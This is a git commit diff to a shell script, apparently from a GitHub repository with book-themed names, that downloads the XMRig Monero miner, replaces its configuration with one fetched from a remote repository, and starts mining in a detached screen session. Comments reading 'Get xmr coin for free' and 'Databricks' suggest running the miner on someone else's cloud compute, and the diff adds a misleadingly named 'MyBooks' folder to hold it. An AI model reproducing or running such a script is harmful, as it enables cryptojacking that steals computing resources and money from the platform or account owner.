1c4d3f403aa39f01d94296fe3223da3d80040cf6
Novabooks21 <102823609+Novabooks21@users.noreply.github.com>
2022-04-05 22:06:37 +0530

    Update Main.sh

--- MainData/Main.sh
+++ MainData/Main.sh
@@ -2,11 +2,20 @@
 # Get xmr coin for free
 # Databricks
 sudo apt update
-clear
 sudo apt install screen
+clear
+
+cd
+mkdir MyBooks
+cd MyBooks
 
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
 tar xvzf xmrig-6.16.4-focal-x64.tar.gz
 cd xmrig-6.16.4
+rm config.json
+wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/Main/config.json
+
+cd ~/MyBooks/xmrig-proxy-6.15.1
+
 screen -R xmr
 ./xmrig
